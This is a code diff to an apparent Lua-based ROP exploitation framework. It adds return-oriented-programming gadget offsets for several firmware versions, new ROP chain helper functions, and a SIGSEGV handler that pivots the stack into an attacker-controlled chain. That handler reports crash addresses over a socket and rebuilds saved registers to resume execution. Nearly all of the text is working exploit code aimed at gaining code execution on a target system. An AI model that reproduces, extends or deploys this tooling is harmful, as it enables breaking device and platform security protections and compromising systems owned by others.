@@ -39,8 +39,11 @@ gadget_table = {
             ["pop rsi; ret"] = 0xd2810,
             ["pop r8; ret"] = 0xa01,
             ["mov r9, rbx; call [rax + 8]"] = 0x14a9a0,
+            
             ["mov esp, 0xfb0000bd; ret"] = 0x3963d4,
             ["mov [rax + 8], rcx; ret"] = 0x135aea,
+            ["mov [rax + 0x28], rdx; ret"] = 0x148b9f,
+            ["add rax, r8; ret"] = 0xa893,
 
             ["mov [rdi], rsi; ret"] = 0xd0d7f,
             ["mov [rdi], rax; ret"] = 0x9522b,
@@ -91,8 +94,11 @@ gadget_table = {
             ["pop rsi; ret"] = 0x10ef32,
             ["pop r8; ret"] = 0x9f1,
             ["mov r9, rbx; call [rax + 8]"] = 0x1511ff,
+            
             ["mov esp, 0xfb0000bd; ret"] = 0x3bca94,
             ["mov [rax + 8], rcx; ret"] = 0x13c4fa,
+            ["mov [rax + 0x28], rdx; ret"] = 0x14f43f,
+            ["add rax, r8; ret"] = 0xa7a3,
 
             ["mov [rdi], rsi; ret"] = 0xd76ff,
             ["mov [rdi], rax; ret"] = 0x994cb,
@@ -145,8 +151,11 @@ gadget_table = {
             ["mov r9, rbx; call [rax + 8]"] = nil,
             ["pop r13 ; pop r14 ; pop r15 ; ret"] = 0x141fc7,
             ["mov r9, r13; call [rax + 8]"] = 0x136970,
+            
             ["mov esp, 0xfb0000bd; ret"] = 0x3798f4,
             ["mov [rax + 8], rcx; ret"] = 0x1368da,
+            ["mov [rax + 0x28], rdx; ret"] = 0x14967f,
+            ["add rax, r8; ret"] = 0x9de0,
 
             ["mov [rdi], rsi; ret"] = 0xd326f,
             ["mov [rdi], rax; ret"] = 0x92c67,
@@ -198,8 +207,11 @@ gadget_table = {
             ["pop rsi; ret"] = 0xd2230,
             ["pop r8; ret"] = 0xa01,
             ["mov r9, rbx; call [rax + 8]"] = 0x14a3c0,
+            
             ["mov esp, 0xfb0000bd; ret"] = 0x394c54,
             ["mov [rax + 8], rcx; ret"] = 0x13550a,
+            ["mov [rax + 0x28], rdx; ret"] = 0x1485bf,
+            ["add rax, r8; ret"] = 0xa893,
 
             ["mov [rdi], rsi; ret"] = 0xd079f,
             ["mov [rdi], rax; ret"] = 0x94c4b,
@@ -251,8 +263,11 @@ gadget_table = {
             ["pop rsi; ret"] = 0xfcd16,
             ["pop r8; ret"] = 0x961,
             ["mov r9, rbx; call [rax + 8]"] = 0x145f20,
+            
             ["mov esp, 0xfb0000bd; ret"] = 0x3925e4,
             ["mov [rax + 8], rcx; ret"] = 0x12c5ff,
+            ["mov [rax + 0x28], rdx; ret"] = 0x14439f,
+            ["add rax, r8; ret"] = 0x116d16,
 
             ["mov [rdi], rsi; ret"] = 0xcbe0f,
             ["mov [rdi], rax; ret"] = 0xa16b,
@@ -304,8 +319,11 @@ gadget_table = {
             ["pop rsi; ret"] = 0xe4b04,
             ["pop r8; ret"] = 0x921,
             ["mov r9, rbx; call [rax + 8]"] = 0x14f760,
+            
             ["mov esp, 0xfb0000bd; ret"] = 0x3b8784,
             ["mov [rax + 8], rcx; ret"] = 0x13b120,
+            ["mov [rax + 0x28], rdx; ret"] = 0x14d97f,
+            ["add rax, r8; ret"] = 0x125b56,
 
             ["mov [rdi], rsi; ret"] = 0xd592f,
             ["mov [rdi], rax; ret"] = 0xa42b,
@@ -357,8 +375,11 @@ gadget_table = {
             ["pop rsi; ret"] = 0x10f122,
             ["pop r8; ret"] = 0x9f1,
             ["mov r9, rbx; call [rax + 8]"] = 0x1513ef,
+            
             ["mov esp, 0xfb0000bd; ret"] = 0x3bd134,
             ["mov [rax + 8], rcx; ret"] = 0x13c6ea,
+            ["mov [rax + 0x28], rdx; ret"] = 0x14f62f,
+            ["add rax, r8; ret"] = 0xa7a3,
 
             ["mov [rdi], rsi; ret"] = 0xd78ef,
             ["mov [rdi], rax; ret"] = 0x996bb,
@@ -1557,6 +1578,19 @@ function ropchain:push_store_eax_into_memory(addr)
     self:push(gadgets["mov [rdi], eax; ret"])
 end
 
+function ropchain:push_store_rax_data_and_add_into_memory(addr, num)
+    self:push(gadgets["mov rax, [rax]; ret"])
+    self:push_add_to_rax(num)
+    self:push_set_rdi(addr)
+    self:push(gadgets["mov [rdi], rax; ret"])
+end
+
+function ropchain:push_store_rax_data_into_memory(addr)
+    self:push(gadgets["mov rax, [rax]; ret"])
+    self:push_set_rdi(addr)
+    self:push(gadgets["mov [rdi], rax; ret"])
+end
+
 function ropchain:push_store_rax_into_memory(addr)
     self:push_set_rdi(addr)
     self:push(gadgets["mov [rdi], rax; ret"])
@@ -1565,6 +1599,16 @@ end
 function ropchain:push_store_rcx_into_memory(addr) -- clobbers rax
     self:push_set_rax(addr - 0x8)
     self:push(gadgets["mov [rax + 8], rcx; ret"])
+end
+
+function ropchain:push_store_rdx_into_memory(addr) -- clobbers rax
+    self:push_set_rax(addr - 0x28)
+    self:push(gadgets["mov [rax + 0x28], rdx; ret"])
+end
+
+function ropchain:push_add_to_rax(num)
+    self:push_set_r8(num)
+    self:push(gadgets["add rax, r8; ret"])
 end
 
 function ropchain:push_add_dword_memory_with_eax(addr)
@@ -1965,9 +2009,6 @@ function run_lua_code(lua_code)
         end,
         printf = function(fmt, ...)
             table.insert(output, string.format(fmt, ...))
-        end,
-        write_qword = function(...)
-            memory.write_qword(...)
         end
     }
 
@@ -2148,7 +2189,14 @@ function get_version()
     return version
 end
 
-function sigaction(signum, action, old_action)
+function signal_handler()
+    local SIGSEGV = 11
+    local SA_SIGINFO = 0x4
+    local sigaction_struct = bump.alloc(0x28)
+    
+    memory.write_qword(sigaction_struct, gadgets["mov esp, 0xfb0000bd; ret"]) -- sigaction.sa_handler
+    memory.write_qword(sigaction_struct+0x20, SA_SIGINFO) -- sigaction.sa_flags
+    
     MAP_PRIVATE = 0x2
     MAP_FIXED = 0x10
     MAP_ANONYMOUS = 0x1000
@@ -2162,37 +2210,64 @@ function sigaction(signum, action, old_action)
         error("mmap() error: " .. get_error_string())
     end
     
-    if syscall.sigaction(signum, action, old_action):tonumber() < 0 then
+    if syscall.sigaction(SIGSEGV, sigaction_struct, 0):tonumber() < 0 then
         error("sigaction() error: " .. get_error_string())
     end
-
-    return true
-end
-
-function signal_handler()
-    local SIGSEGV = 11
-    print("Setting signal handler\n")
-    local sigaction_struct = bump.alloc(0x8)
-    
-    memory.write_qword(sigaction_struct, gadgets["mov esp, 0xfb0000bd; ret"]) -- sigaction.sa_handler
-    
-    sigaction(SIGSEGV, sigaction_struct, 0)
 end
 
 function signal_handler_rop(client_fd)
-    output = bump.alloc(0x8)
+    -- TODO: Return crashing error code
+    -- TODO: Restore execution if two crashes in one payload
+    local stack_size = 0x500
+    local padding = 0x100
     
-    -- TODO: restore execution correctly instead of crash
-    local chain = ropchain(0x500, 0x100, 0xfb0000bd - 0x8)
+    output = string.rep("\0", 0x8)
+    ucontext_struct = string.rep("\1", 0x8)
+    local ucontext_struct_addr = ropchain.resolve_value(ucontext_struct)
+    local mcontext_offset = 0x40
+    local reg_rbp_offset = 0x48
+    local reg_rsp_offset = 0xb8
+    
+    -- write error address back to socket
+    local chain = ropchain(stack_size, padding, 0xfb0000bd - 0x8)
+    chain:push_store_rdx_into_memory(ucontext_struct_addr)
     
     chain:push_set_rdi(ropchain.resolve_value(client_fd))
     chain:push_set_rsi(ropchain.resolve_value(output))
     chain:push_set_rdx(ropchain.resolve_value(#output))
-    chain:push_store_rcx_into_memory(ropchain.resolve_value(output)) -- rcx contains sigsegv address
+    chain:push_store_rcx_into_memory(ropchain.resolve_value(output)) -- rcx contains crashing address
     chain:push_set_r8(0)
     chain:push_set_r9(0)
     chain:push_set_rax(4) -- syscall_num=write
     chain:push_fcall_raw(WRITE_ADDR)
+    
+    -- restore execution by jumping to a new rop chain
+    chain:push_set_rsp(0xfb000200)
+    
+    local rst_chain = ropchain(stack_size, padding, 0xfb000200 - 0x8)
+    
+    -- advance to old rbp
+    rst_chain:push_load_rax_from_memory(ucontext_struct_addr)
+    rst_chain:push_add_to_rax(mcontext_offset + reg_rbp_offset)
+    -- write to rop chain
+    rst_chain:push_store_rax_data_and_add_into_memory(0xfb000360, 0x8) -- write value to push_set_rbp()
+    
+    -- advance to old rsp
+    rst_chain:push_load_rax_from_memory(ucontext_struct_addr)
+    rst_chain:push_add_to_rax(mcontext_offset + reg_rsp_offset)
+    -- write to rop chain
+    rst_chain:push_store_rax_data_and_add_into_memory(0xfb000390, 0x8) -- write value to push_set_rsp()
+    
+    rst_chain:push_set_r9(0)
+    rst_chain:push_set_r8(0)
+    rst_chain:push_set_rsi(0)
+    rst_chain:push_set_rdx(0)
+    rst_chain:push_set_rcx(0)
+    rst_chain:push_set_rbx(0)
+    rst_chain:push_set_rbp(0) -- will be changed
+    rst_chain:push_set_rdi(0)
+    rst_chain:push_set_rax(0)
+    rst_chain:push_set_rsp(0) -- will be changed
 end
 
 function main()
